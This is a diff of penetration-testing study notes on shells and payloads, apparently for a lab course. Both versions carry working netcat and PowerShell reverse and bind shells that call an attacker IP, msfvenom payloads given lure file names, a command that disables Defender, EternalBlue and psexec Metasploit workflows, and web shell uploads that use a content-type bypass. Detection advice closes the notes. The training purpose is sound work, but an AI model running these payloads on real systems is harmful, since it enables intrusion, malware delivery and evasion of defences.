@@ -1,316 +1,316 @@
 # Shells & Payloads
 
-Shell = interactive OS access via exploit. Reverse = target calls back to attacker (outbound, bypasses inbound firewall). Bind = attacker connects to listener on target (blocked by strict ingress rules).
+Shell = the prize of exploiting a vuln: interactive access to the OS, system commands, filesystem. From there: enumerate for privesc, pivot, transfer files, persist. CLI shells are quieter than graphical (VNC/RDP), faster to work in, easier to automate. A web shell is the same idea through an uploaded script controlled from the browser. Payload = the command/code that exploits the vulnerability and gets us there.
 
-revshells.com — reverse shell generator reference. Reverse Shell Cheat Sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Laudanum webshells: `/usr/share/laudanum/` | Nishang Antak: `/usr/share/nishang/Antak-WebShell/`
+## Anatomy of a Shell
 
----
-
-## Netcat — Bind & Reverse Shells
-
-Bind shell (target listens, attacker connects):
+Terminal emulator ≠ the shell itself — the command language interpreter can be swapped. Identify what you're sitting in:
 
 ```bash
-# Target (server) — bind bash to TCP
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> <PORT> > /tmp/f
-
-# Attacker (client) — connect
-nc -nv <TARGET_IP> <PORT>
+ps        # running interpreter (e.g. bash)
+env       # SHELL=/bin/bash
 ```
 
-Reverse shell (attacker listens, target calls back):
+`$` prompt points to Bash/ksh/POSIX-style shells.
+
+## Bind Shells
+
+Target runs a listener, we connect to its IP:port. Working against it: a listener must already be started on the target (we'd need execution first), edge firewalls/NAT/PAT choke inbound connections, host firewalls block non-trusted inbound. Incoming connection = easier for defenders to catch — reverse shells usually win.
+
+Plain Netcat TCP session first (not a shell, just a pipe):
 
 ```bash
-# Attacker — start listener
-sudo nc -lvnp 443
-
-# Target — connect back
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> 443 > /tmp/f
+nc -lvnp 7777              # target (server)
+nc -nv <TARGET_IP> 7777    # attack box (client)
 ```
 
-Netcat send/receive files:
+Real bind shell — serve bash over the listener, run on target:
 
 ```bash
-# Receiver listens
-nc -lvnp 8000 > <FILE>
-ncat -l -p 8000 --recv-only > <FILE>
-
-# Sender connects
-nc -q 0 <TARGET> 8000 < <FILE>
-ncat --send-only <TARGET> 8000 < <FILE>
-
-# Bash fallback (no nc)
-cat < /dev/tcp/<LHOST>/8000 > <FILE>
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> 7777 > /tmp/f
 ```
 
-One-liner breakdown — `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> <PORT> > /tmp/f`:
+```bash
+nc -nv <TARGET_IP> 7777    # attack box → target's bash prompt
+```
 
-- `rm -f /tmp/f` — remove FIFO if exists
-- `mkfifo /tmp/f` — create named pipe
-- `cat /tmp/f |` — pipe FIFO to bash stdin
-- `/bin/bash -i 2>&1 |` — interactive shell, stderr→stdout, pipe to nc
-- `nc <LHOST> <PORT> > /tmp/f` — connect back, redirect output to FIFO (closes loop)
+Payloads differ per target OS. This one was delivered manually — real targets need an exploit or delivery trick first.
 
----
+## Reverse Shells
 
-## PowerShell Reverse Shell
+Our box listens, the target connects out — admins tend to overlook outbound traffic. Bind the listener to a common port (443) so egress filtering doesn't kill the callback; DPI/L7-aware firewalls can still spot it regardless of port.
 
-Disable AV first (if needed):
+```bash
+sudo nc -lvnp 443          # attack box
+```
+
+Netcat is not native to Windows — prefer whatever is native on the target (living off the land). Always ask: what applications and shell languages exist on this host?
+
+```cmd
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Defender will block this ("script contains malicious content"). Lab workaround from an admin PowerShell:
 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-PowerShell reverse shell one-liner (run in cmd.exe on target):
+The Reverse Shell Cheat Sheet (public repo) has one-liners and generators for most languages — but admins know these repos too, expect to customize.
 
-```cmd
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-```
+## Introduction to Payloads
 
-Key parts: `TCPClient` = TCP socket to attacker. `iex $data` = execute received command. `$sendback2` = output + PS prompt. `$sendbyte` = encoded response sent back.
-
----
-
-## msfvenom Payloads
-
-Staged = `/` between components (`windows/shell/reverse_tcp` — stager then stage). Stageless = fused name (`windows/shell_reverse_tcp`). Staged = smaller initial stager but needs stable comms. Stageless = all-in-one, better for unstable links.
+The reverse variant of the bash one-liner:
 
 ```bash
-msfvenom -l payloads              # list all payloads
-
-# Linux ELF stageless
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f elf > shell.elf
-
-# Windows EXE stageless
-msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f exe > payload.exe
-
-# Windows Meterpreter staged EXE
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe > meter.exe
-
-# ASPX webshell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx > shell.aspx
-
-# PHP webshell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw > shell.php
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7777 > /tmp/f
 ```
 
-Catch all msfvenom/MSF shells:
+Anatomy: `mkfifo` creates the named pipe, `cat` feeds it to interactive bash (`-i`), `2>&1` folds stderr into stdout, nc ships everything to our listener, and nc's output redirects back into the pipe.
 
-```
-use multi/handler
-set PAYLOAD <same payload used in msfvenom>
-set LHOST tun0
-set LPORT 4444
-exploit -j
-```
+PowerShell one-liner, condensed: `-nop -c` runs PowerShell with no profile and executes the block; TCPClient dials back, GetStream is the channel; a byte-array buffer loops on Read, `iex` executes whatever arrives locally, results get appended with a `PS <path>>` prompt and written back ASCII-encoded; Close on exit.
 
----
+Same shell as a Nishang script (Invoke-PowerShellTcp), reverse or bind:
 
-## Metasploit — Full Exploit Workflow
-
-EternalBlue (MS17-010) example:
-
-```
-# 1. Check if vulnerable
-use auxiliary/scanner/smb/smb_ms17_010
-set RHOSTS <TARGET>
-run
-
-# 2. Select exploit
-use exploit/windows/smb/ms17_010_psexec
-# or
-use exploit/windows/smb/ms17_010_eternalblue
-
-# 3. Set options
-set RHOSTS <TARGET>
-set LHOST tun0
-set SMBUser <USER>    # if creds known
-set SMBPass <PASS>    # if creds known
-
-# 4. Run
-exploit
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 4444   # nc/powercat listener must be waiting
+Invoke-PowerShellTcp -Bind -Port 4444                               # connect to it with nc/powercat
 ```
 
-PSExec (needs valid admin creds):
+Payload choice follows the target — its OS, shell interpreters, programming languages present. Not everything is a hand-pasted one-liner; frameworks generate and deliver packaged payloads.
+
+## Automating Payloads & Delivery with Metasploit
+
+```bash
+sudo msfconsole
+```
+
+Module workflow from the module's example (nmap showed SMB on 445):
 
 ```
+search smb
 use exploit/windows/smb/psexec
-set RHOSTS <TARGET>
+```
+
+Module name anatomy: `exploit/windows/smb/psexec` = module type / target platform / service / tool uploaded to the target. Search result numbers are relative to that search — don't memorize them.
+
+```
+set RHOSTS <TARGET_IP>
 set SHARE ADMIN$
-set SMBUser <USER>
-set SMBPass <PASS>
-set LHOST tun0
+set SMBUser <USERNAME>
+set SMBPass <PASSWORD>
+set LHOST <ATTACKER_IP>
 exploit
 ```
 
----
+Defaults to windows/meterpreter/reverse_tcp. Meterpreter = in-memory DLL injection payload, far more than a raw TCP shell: file up/download, system commands, keylogger, service and process management. `?` lists commands; `shell` drops into a native system shell when Meterpreter's limits get in the way.
 
-## Meterpreter → System Shell
+The psexec module itself: uses a valid admin username/password (or hash) to execute an arbitrary payload — like SysInternals psexec; cleans up after itself with a random service name/description.
 
-```
-meterpreter > getuid               # current user
-meterpreter > sysinfo              # OS info
-meterpreter > shell                # drop to system shell (cmd.exe on Windows, sh on Linux)
-meterpreter > ps                   # process list
-meterpreter > migrate <PID>        # migrate to process
-meterpreter > steal_token <PID>    # impersonate process token
-meterpreter > hashdump             # dump SAM hashes (needs SYSTEM)
-meterpreter > background           # background session
-```
+## Crafting Payloads with MSFvenom
 
-From system shell — identify shell type: prompt `C:\>` = cmd.exe. Prompt `PS C:\>` = PowerShell.
+`msfvenom -l payloads` lists everything (592 at time of writing). Names lead with the target OS. Staged vs stageless:
 
----
-
-## Spawning Interactive / TTY Shells
-
-Use when dropped into non-interactive/limited shell (no prompt, no job control, can't use `su`/`sudo`).
-
-Python TTY:
+- Staged — a small stage executes, then pulls the rest of the payload over the network. Visible in the name: each `/` after the shell part is another stage (`linux/x86/shell/reverse_tcp`, `windows/meterpreter/reverse_tcp`).
+- Stageless — whole payload in one shot, name pressed together (`linux/zarch/meterpreter_reverse_tcp`, `windows/meterpreter_reverse_tcp`).
+- Stageless is the pick on low-bandwidth/high-latency links (staged sessions can go unstable there) and can help evasion — less traffic.
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-python -c 'import pty; pty.spawn("/bin/sh")'
-which python python3   # check presence first
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f elf > createbackup.elf
+msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe > BonusCompensationPlanpdf.exe
 ```
 
-Other shell escapes:
+`-p` payload, LHOST/LPORT callback target, `-f` output format, `>` names the file — pick something inconspicuous a user would open. Catch with `sudo nc -lvnp 443`. Delivery ideas: email attachment, download link, chained into an MSF exploit module (needs internal presence), USB on an onsite test. Unencoded/unencrypted exe → near-certain Defender detection.
+
+## Infiltrating Windows
+
+### Prominent Windows Exploits
+
+- **MS08-067** — SMB flaw, trivially exploitable; powered Conficker, used by Stuxnet.
+- **EternalBlue (MS17-010)** — SMBv1 RCE from the Shadow Brokers leak; WannaCry/NotPetya; still a common way into vulnerable hosts.
+- **PrintNightmare** — Print Spooler RCE; with valid creds or a low-priv shell, install a printer + driver → SYSTEM.
+- **BlueKeep (CVE-2019-0708)** — RDP RCE; Windows 2000 through Server 2008 R2.
+- **Sigred (CVE-2020-1350)** — DNS SIG record parsing flaw → Domain Admin (the DC usually runs DNS).
+- **SeriousSam (CVE-2021-36934)** — non-elevated users can read the SAM database via `C:\Windows\system32\config` and the same perms exist on volume shadow copy backups → credential dump.
+- **Zerologon (CVE-2020-1472)** — Netlogon (MS-NRPC) crypto flaw; ~256 guesses at a computer account password, seconds of work → DC takeover.
+
+### Enumerating Windows & Fingerprinting Methods
+
+ICMP TTL of 128 (or 32) = likely Windows:
+
+```bash
+ping <TARGET_IP>
+sudo nmap -v -O <TARGET_IP>                      # OS detection — read "OS details: Microsoft Windows ..."
+sudo nmap -v <TARGET_IP> --script banner.nse     # banner-grab every open port
+```
+
+`-O` turning up nothing → retry with `-A -Pn`. Firewalls can skew OS detection — never rely on a single check.
+
+### Bats, DLLs, & MSI Files, Oh My!
+
+Payload file types and what they buy: **DLL** — inject or hijack a vulnerable library → SYSTEM / UAC bypass. **Batch (.bat)** — automated command runs: open a port, call back, enumerate, feed results over the port. **VBS** — phishing vehicle (enable-macro clicks and the like). **MSI** — Windows Installer database, execute via `msiexec` for e.g. an elevated reverse shell. **PowerShell** — .NET-based, the most options for execution and shells.
+
+### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution
+
+Generation: MSFVenom/MSF (swiss-army knife), Payloads All The Things (cheat sheets), Mythic (C2 + unique payloads), Nishang (offensive PowerShell), Darkarmour (obfuscated Windows binaries).
+
+Transfer/execution: Impacket (psexec, smbclient, wmi, Kerberos tools, SMB server), SMB shares — domain hosts often have C$/admin$ usable for payload drop and exfil, MSF exploit modules build+stage+execute automatically, and whatever protocol is open (FTP, TFTP, HTTP/S).
+
+### Example Compromise Walkthrough
+
+1. `nmap -v -A <TARGET_IP>` → Windows Server 2016, IIS 10, SMB. Candidates: IIS, SMB via Impacket/creds, or an OS RCE — MS17-010 spans Server 2008–2016, so validate:
+
+```
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS <TARGET_IP>
+run
+```
+
+→ "Host is likely VULNERABLE to MS17-010"
+
+2. `search eternal` → the author had better luck with the psexec variant:
+
+```
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS <TARGET_IP>
+set LHOST <ATTACKER_IP>
+exploit
+```
+
+→ "SYSTEM session obtained", Meterpreter opens. `getuid` → NT AUTHORITY\SYSTEM.
+
+3. `shell` → native cmd. Identify it from the prompt: `C:\Windows\system32>` = cmd, `PS ...>` = PowerShell.
+
+### CMD-Prompt and PowerShells for Fun and Profit
+
+Use **cmd** when: the host is old enough to lack PowerShell (pre-Win7), you need simple interaction / batch files / net commands / MS-DOS tools, execution policy or UAC would hinder PowerShell, or stealth matters — cmd keeps no session command history, PowerShell does.
+
+Use **PowerShell** when: cmdlets or custom scripts, .NET object interaction, aliases, cloud services — and stealth is a lesser concern.
+
+### WSL and PowerShell For Linux
+
+WSL traffic to/from the instance isn't parsed by Windows Firewall or Defender — a host blind spot; in-the-wild malware already uses WSL/python3 to fetch payloads, and PowerShell Core on Linux behaves similarly. Both have been seen bypassing AV/EDR.
+
+## Infiltrating Unix/Linux
+
+70%+ of webservers run Unix. Before choosing an attack path, answer: which distro? what shells/programming languages exist? what role does the box serve? what app is it hosting? any known vulns?
+
+### Gaining a Shell Through Attacking a Vulnerable Application
+
+1. `nmap -sC -sV <TARGET_IP>` → 21/22/80/111/443/3306, CentOS + Apache 2.4.6 + PHP 7.2.34 → web server with an app. Browse to it: rConfig (network device config management — owning it likely means owning every device it manages), version 3.9.6 printed on the login page.
+2. Search `rConfig 3.9.6 vulnerability`, and `search rconfig` in MSF. Local MSF may just not have the module — search `rConfig 3.9.6 exploit metasploit github`, pull `rconfig_vendors_auth_file_upload_rce.rb`, and drop it into the local modules tree:
+
+```bash
+locate exploits   # find the MSF path — Pwnbox: /usr/share/metasploit-framework/modules/exploits
+```
+
+Save under `.../exploits/linux/http` with the `.rb` extension (all MSF modules are Ruby). Keep MSF updated (`apt update; apt install metasploit-framework`).
+
+3. Run it:
+
+```
+use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+exploit
+```
+
+Chain it performs: verifies vulnerable version → logs in → uploads PHP payload → triggers it → deletes it → hands over a Meterpreter session. `shell` drops to a non-tty shell running as `apache` (no prompt — apache has no shell defined in its environment).
+
+4. TTY upgrade if Python exists (`which python`):
+
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+Prompt appears (sh-4.2$), and `su`/`sudo` — usually needed for privesc — become usable.
+
+## Spawning Interactive Shells
+
+Any `/bin/sh` below can be swapped for whatever shell binary exists on the box (usually sh or bash). No Python required:
 
 ```bash
 /bin/sh -i
-/bin/bash -i
-
 perl -e 'exec "/bin/sh";'
-ruby -e 'exec "/bin/sh"'
-lua -e 'os.execute("/bin/sh")'
-
 awk 'BEGIN {system("/bin/sh")}'
-
-find / -name nameoffile -exec /bin/sh \; -quit
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 find . -exec /bin/sh \; -quit
-
 vim -c ':!/bin/sh'
-# inside vim:
+```
+
+Script-context variants: `perl: exec "/bin/sh";`, `ruby: exec "/bin/sh"`, `lua: os.execute('/bin/sh')` — run from a script, not the command line.
+
+From inside vim:
+
+```text
+vim
 :set shell=/bin/sh
 :shell
 ```
 
-Check permissions after landing:
+Then check what the account can do:
 
 ```bash
-sudo -l                # what can current user sudo
-ls -la <path>          # file permissions
+ls -la <path/to/file>
+sudo -l    # needs a stable interactive shell — an unstable one may return nothing
 ```
 
----
+`sudo -l` showing `(ALL : ALL) NOPASSWD: ALL` is an immediate privesc path.
 
-## Windows Fingerprinting
+## Introduction to Web Shells
 
-TTL fingerprinting via ping: Windows = ~128. Linux = ~64. macOS = ~64. (Subtract hops — if TTL ~128, likely Windows.)
+External perimeters are usually hardened — no exposed SMB. The way in is most often web app attacks (file upload, SQLi, RFI/LFI, command injection), password spraying (RDS, VPN portals, Citrix, OWA — anything AD-authenticated), or social engineering.
+
+Upload vectors to look for: public upload forms accepting PHP/JSP/ASP.NET, self-registration with a profile-picture upload (bypass client-side checks), Tomcat/Axis2/WebLogic WAR deployment, misconfigured FTP that writes into the webroot.
+
+A web shell = browser-based shell on the web server's OS, written in the server's language. Treat it as a foothold only — apps may auto-delete uploads and interactivity is poor. Upgrade to a reverse shell.
+
+## Laudanum, One Webshell to Rule Them All
+
+Ready-made injectable files for asp, aspx, jsp, php and more; ships with Parrot/Kali at `/usr/share/laudanum`. Most files copy as-is; the shells need your IP added first. Read the comments in each file before use.
 
 ```bash
-ping <TARGET>            # TTL ~128 = Windows
-
-nmap -v -O <TARGET>      # OS detection → "Microsoft Windows 10 1709-1909"
-sudo nmap -v 192.168.x.x --script banner.nse   # banner grab per open port
+cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
 ```
 
-Ports commonly open on Windows: 135 (MSRPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985/5986 (WinRM).
+Edit the `allowedIps` variable (line 59) to your attack IP. Strip ASCII art and comments — they're commonly signatured by defenders/AV. Upload via the app's own upload function, note the returned save path, browse to the file, run commands (`systeminfo` etc.).
 
----
+## Antak Webshell
 
-## Web Shells
-
-### Laudanum (multi-language, pre-built)
+ASP.NET web shell from the Nishang project — a PowerShell console in the browser. Each command executes as a new process; can run scripts in memory and encode commands. Located at `/usr/share/nishang/Antak-WebShell`.
 
 ```bash
-ls /usr/share/laudanum/        # asp, aspx, php, jsp etc.
-cp /usr/share/laudanum/aspx/shell.aspx ~/demo.aspx
+cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
 ```
 
-Edit allowed IPs before uploading (line 59 in aspx shell). Upload via file upload functionality or FTP. Navigate to uploaded path in browser. Execute system commands via browser interface.
+Set the access credentials on line 14 so nobody stumbles into your shell; again, remove ASCII art/comments. Upload → browse → log in → PowerShell. Built-in buttons: submit commands, upload/download files, encode & execute, parse web.config, execute SQL queries. Good launchpad to C2 — upload a payload directly or pull one down with a PowerShell one-liner.
 
-Bypass file type restriction (Burp): intercept upload → change `Content-Type: application/x-php` → `Content-Type: image/gif` → Forward. Tricks server into accepting non-image file.
+## PHP Web Shells
 
-### Antak (ASPX + PowerShell, Nishang)
+PHP on the server → PHP web shell is on the table. Manual rConfig 3.9.6 route (default creds admin:admin):
 
-```bash
-ls /usr/share/nishang/Antak-WebShell/
-cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/Upload.aspx
+1. Devices > Vendors > Add Vendor — logo upload accepts images only (.png/.jpg/.gif).
+2. Proxy the browser through Burp (127.0.0.1:8080), upload WhiteWinterWolf's PHP Web Shell as the "logo", intercept the POST, change `Content-type` from `application/x-php` to `image/gif`, forward.
+3. Vendor gets added (torn-paper icon = server didn't recognize it as an image). Browse to:
+
+```text
+/images/vendor/connect.php
 ```
 
-Edit line 14 — set username and password before uploading. Provides PowerShell-like interface in browser. Can upload/download files, encode+execute scripts, run cmdlets.
+→ non-interactive shell, entirely in the browser.
 
-### PHP Web Shell (WhiteWinterWolf)
+Considerations: uploads may be auto-deleted after a period, no command chaining (`whoami && hostname` fails), unstable, and easy to leave evidence behind. Preferred pattern: use the web shell to establish a reverse shell, then delete the payload. Document every attempt — payload names, hashes (sha1/MD5), upload locations — for the report.
 
-```php
-<?php system($_GET['cmd']); ?>
-```
+## Detection & Prevention
 
-Upload as .php (bypass content-type check via Burp if needed). Access: `http://<TARGET>/uploads/shell.php?cmd=whoami`
+ATT&CK mapping for this module: **Initial Access** (public-facing app or misconfigured service → foothold), **Execution** (attacker-supplied code running on the host — everything in this module), **Command & Control** (the channel that follows; blends into standard ports/protocols — HTTP/S, DNS, NTP, even Slack/Discord/Teams).
 
-PHP shell considerations: may auto-delete after timeout, limited interactivity, chained commands may fail, leaves traces. Use to establish foothold → upgrade to reverse shell → delete artifact.
+Events worth alerting on:
 
----
+- File uploads — check application logs; internet-exposed hosts need hardening + AV + monitoring.
+- Non-admin users in shells — who was the last regular user to run `whoami`? End-host→end-host SMB (not end-host→server) is suspicious. Enable user-interaction and PowerShell logging.
+- Anomalous NetFlow — top talkers, unique site visits, a heartbeat on a nonstandard port (4444 = Meterpreter default), remote-login and bulk GET/POST spikes.
 
-## Infiltrating Linux — rConfig Example
+Netcat sessions are plaintext — anyone capturing traffic reads every command (the module's Wireshark follow shows `net user` account creation in the clear). A DPI-capable appliance acts as AV for the network and can kill the channel.
 
-```bash
-# 1. Enumerate
-nmap -sC -sV <TARGET>
+Endpoint protection: Defender on, firewall on across all profiles (Domain/Private/Public), exceptions only via change management, patch strategy, monitoring/alerting.
 
-# 2. Identify app + version from web/banner
-# 3. Search for exploit
-searchsploit rconfig 3.9.6
-# or in msfconsole:
-search rconfig
-use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
-set RHOSTS <TARGET>
-set LHOST tun0
-exploit
-```
-
-After MSF shell — drop to system:
-
-```
-meterpreter > shell
-# non-interactive → spawn TTY
-python -c 'import pty; pty.spawn("/bin/sh")'
-```
-
----
-
-## Detection Indicators (Defender Perspective)
-
-MITRE ATT&CK relevant tactics: T1190 (Exploit Public-Facing Application), T1059 (Command & Scripting Interpreter), T1105 (Ingress Tool Transfer), T1571 (Non-Standard Port).
-
-Events to watch: file uploads to webserver dirs, `whoami`/`id`/`net user` from non-admin users, NetFlow anomalies on port 4444 or other non-standard ports, cleartext shell traffic (Wireshark shows full command output), connections to unexpected external IPs.
-
-Netcat shell traffic is unencrypted — all commands + output visible in PCAP. MSF6 Meterpreter uses AES-encrypted comms = harder to detect at network layer.
-
-User agent evasion (change PS UA to bypass blacklists):
-
-```powershell
-$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-Invoke-WebRequest http://<LHOST>/nc.exe -UserAgent $UserAgent -OutFile nc.exe
-```
-
-Known suspicious user agents: `WindowsPowerShell/5.1` (Invoke-WebRequest), `Microsoft-CryptoAPI/10.0` (Certutil), `Microsoft BITS/7.8` (BITSAdmin), `WinHttp.WinHttpRequest.5` (WinHttp).
-
----
-
-## Notable Windows Vulnerabilities (Exam Reference)
-
-|CVE|Name|Notes|
-|---|---|---|
-|MS08-067|Conficker/Stuxnet|SMB, pre-Vista, wormable|
-|MS17-010|EternalBlue|SMB v1, Win7-Server2016, WannaCry/NotPetya|
-|CVE-2021-34527|PrintNightmare|Print Spooler RCE, low-priv → SYSTEM, DCs affected|
-|CVE-2019-0708|BlueKeep|RDP pre-auth RCE, Win2000-Server2008 R2, BSOD risk|
-|CVE-2021-36934|SeriousSam|SAM readable by non-admin via VSS, credential dump|
-|CVE-2020-1472|Zerologon|MS-NRPC crypto flaw, domain takeover, ~256 guesses|
-|CVE-2020-1350|SIGRed|DNS SIG record flaw, domain admin via DNS server|
-
-> [!tip] Payload delivery decision tree: have creds + SMB open → psexec. No creds + MS17-010 vulnerable → EternalBlue. Web app upload available → webshell (Laudanum/Antak/PHP). Need social engineering delivery → msfvenom EXE/ELF. Need in-browser C2 → web shell + upgrade to reverse shell.
-
-> [!warning] Always catch shells on common ports (443, 80, 53) — outbound traffic on these is rarely blocked. Non-standard ports like 4444 are easily flagged by IDS/SIEM. AV will block default msfvenom payloads — disable AV or use encoded/template payloads for lab practice.
+Mitigations that actually bite: application sandboxing, least privilege, host hardening + segmentation (STIGs; exposed hosts in a DMZ to stop lateral movement), and firewalls with strict inbound *and* outbound rules — NAT alone can break a shell payload that doesn't account for it.
